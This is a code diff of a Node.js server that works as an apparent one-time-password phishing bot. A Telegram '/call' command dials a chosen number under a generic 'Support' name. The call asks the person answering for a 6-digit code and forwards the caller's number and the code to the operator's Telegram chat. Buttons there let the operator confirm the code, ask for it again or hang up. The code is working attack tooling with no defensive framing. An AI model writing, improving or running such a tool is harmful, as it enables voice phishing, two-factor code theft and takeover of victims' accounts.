@@ -7,7 +7,7 @@ const app = express()
 app.use(bodyParser.urlencoded({extended:false}))
 app.use(bodyParser.json())
 
-// ENV
+// ENV VARIABLES
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN
 const CHAT_ID = process.env.CHAT_ID
 
@@ -19,112 +19,45 @@ const SW_NUMBER = process.env.SW_NUMBER
 // SETTINGS
 let settings={
 company:"Support",
-digits:6,
-assistant:0
+digits:6
 }
 
-const assistants=[
-"Polly.Joanna",
-"Polly.Matthew",
-"Polly.Amy",
-"Polly.Brian",
-"Polly.Emma",
-"Polly.Justin"
-]
-
-// STATE
-let activeCall=null
-let callStart=0
-let lastCaller=null
+// CALL STATE
+let activeCallSid=null
+let activeCaller=null
 let lastCode=null
-let panelMessage=null
-let logs=[]
 
-// TELEGRAM SEND
+// TELEGRAM SEND FUNCTION
 async function tg(method,data){
-
 return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify(data)
 })
-
 }
 
-// PANEL
-async function createPanel(){
+// SPEAK TO CALLER
+async function speakToCaller(message){
 
-let res=await tg("sendMessage",{
-chat_id:CHAT_ID,
-text:"📞 IVR Panel\nWaiting for call..."
-})
+if(!activeCallSid) return
 
-let data=await res.json()
-
-panelMessage=data.result.message_id
-
-}
-
-function formatTime(){
-
-if(!callStart)return "0s"
-
-let sec=Math.floor((Date.now()-callStart)/1000)
-
-let m=Math.floor(sec/60)
-let s=sec%60
-
-return `${m}m ${s}s`
-
-}
-
-async function updatePanel(){
-
-if(!panelMessage)return
-
-let text="📞 IVR Control Panel\n\n"
-
-if(activeCall){
-
-text+=`Caller: ${activeCall}\n`
-text+=`Code: ${lastCode}\n`
-text+=`Duration: ${formatTime()}\n`
-
-}else{
-
-text+="No active call\n"
-
-}
-
-text+=`\nCompany: ${settings.company}`
-text+=`\nDigits: ${settings.digits}`
-text+=`\nAssistant: ${settings.assistant+1}`
-
-await tg("editMessageText",{
-chat_id:CHAT_ID,
-message_id:panelMessage,
-text:text,
-reply_markup:{
-inline_keyboard:[
-[
-{ text:"✔ Confirm", callback_data:"confirm"},
-{ text:"🔁 Ask Again", callback_data:"again"}
-],
-[
-{ text:"⛔ Hang Up", callback_data:"hangup"}
-]
-]
-}
+await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}`,{
+method:"POST",
+headers:{
+"Authorization":"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:`Twiml=<Response><Say>${message}</Say><Pause length="20"/></Response>`
 })
 
 }
 
-// ROOT
+// ROOT TEST
 app.get("/",(req,res)=>{
 res.send("Server running")
 })
 
-// IVR
+// IVR ROUTE
 app.post("/ivr",async(req,res)=>{
 
 const digits=req.body.Digits
@@ -139,7 +72,7 @@ return res.send(`
 
 <Gather numDigits="${settings.digits}" action="/ivr" method="POST" timeout="10">
 
-<Say voice="${assistants[settings.assistant]}">
+<Say>
 Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
 </Say>
 
@@ -152,112 +85,119 @@ Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
 
 }
 
-// CODE RECEIVED
-activeCall=caller
-lastCaller=caller
+// DIGITS RECEIVED
+activeCallSid=req.body.CallSid
+activeCaller=caller
 lastCode=digits
-callStart=Date.now()
-
-logs.unshift({
-caller,
-code:digits,
-time:new Date().toLocaleTimeString()
-})
-
-logs=logs.slice(0,10)
 
 await tg("sendMessage",{
 chat_id:CHAT_ID,
 text:`📞 CODE RECEIVED
 
 Caller: ${caller}
-Code: ${digits}`
-})
+Code: ${digits}
 
-await updatePanel()
+Choose action:`,
+
+reply_markup:{
+inline_keyboard:[
+[
+{ text:"✔ Confirm", callback_data:"confirm"},
+{ text:"🔁 Ask Again", callback_data:"again"}
+],
+[
+{ text:"⛔ Hang Up", callback_data:"hangup"}
+]
+]
+}
+
+})
 
 res.type("text/xml")
 
 res.send(`
 <Response>
-
-<Say voice="${assistants[settings.assistant]}">
+<Say>
 Thank you. Your code has been received. Please wait.
 </Say>
-
 <Pause length="60"/>
-
 </Response>
 `)
 
 })
 
-// TELEGRAM
+// TELEGRAM WEBHOOK
 app.post("/telegram",async(req,res)=>{
 
-let msg=req.body
+const data=req.body
 
-if(msg.callback_query){
+// BUTTON PRESSED
+if(data.callback_query){
 
-let action=msg.callback_query.data
+const action=data.callback_query.data
 
 if(action=="confirm"){
 
-activeCall=null
-callStart=0
+await speakToCaller("Thank you. Your code has been confirmed.")
 
 await tg("sendMessage",{
 chat_id:CHAT_ID,
-text:"✔ Call confirmed and ended."
+text:"✔ Code confirmed"
 })
+
+activeCallSid=null
 
 }
 
 if(action=="again"){
 
-await tg("sendMessage",{
-chat_id:CHAT_ID,
-text:"🔁 Ask caller to enter code again."
-})
+await speakToCaller("Please enter your code again.")
 
 }
 
 if(action=="hangup"){
 
-activeCall=null
-callStart=0
+await speakToCaller("The call will now end.")
 
-await tg("sendMessage",{
-chat_id:CHAT_ID,
-text:"⛔ Call ended."
-})
+activeCallSid=null
 
 }
 
 }
 
-if(msg.message){
+// TELEGRAM COMMANDS
+if(data.message){
 
-let text=msg.message.text
+const text=data.message.text
 
+// STATUS
 if(text=="/status"){
 
 await tg("sendMessage",{
 chat_id:CHAT_ID,
-text:`Active call: ${activeCall || "none"}`
+text:`Active caller: ${activeCaller || "none"}`
 })
 
 }
 
-if(text=="/logs"){
+// START CALL
+if(text.startsWith("/call")){
 
-let t="📜 Last Calls\n\n"
+const number=text.split(" ")[1]
 
-logs.forEach(l=>{
-t+=`${l.time} - ${l.caller} - ${l.code}\n`
+await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls`,{
+method:"POST",
+headers:{
+"Authorization":"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:`From=${SW_NUMBER}&To=${number}&Url=https://${req.headers.host}/ivr`
 })
 
-await tg("sendMessage",{chat_id:CHAT_ID,text:t})
+await tg("sendMessage",{
+chat_id:CHAT_ID,
+text:`📞 Calling ${number}`
+})
 
 }
 
@@ -267,16 +207,9 @@ res.sendStatus(200)
 
 })
 
-// TIMER
-setInterval(updatePanel,2000)
-
-// START
+// SERVER START
 const PORT=process.env.PORT||3000
 
-app.listen(PORT,async()=>{
-
+app.listen(PORT,()=>{
 console.log("Server running")
-
-await createPanel()
-
 })
